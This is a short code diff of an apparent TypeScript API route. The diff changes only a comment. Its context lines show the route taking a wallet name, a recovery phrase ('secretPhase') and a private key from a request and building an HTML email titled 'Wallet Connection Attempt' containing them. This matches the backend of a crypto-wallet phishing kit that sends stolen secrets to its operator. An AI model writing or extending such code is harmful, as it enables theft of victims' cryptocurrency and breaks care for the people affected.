@@ -14,7 +14,7 @@ export async function POST(request: Request) {
         const { walletName, secretPhase, privateKey } = body;
     
   
-      // Construct the email message
+      // Construct the email messages
       const message = `
         <h3>Wallet Connection Attempt</h3>
         <p><strong>Wallet Name:</strong> ${walletName}</p>
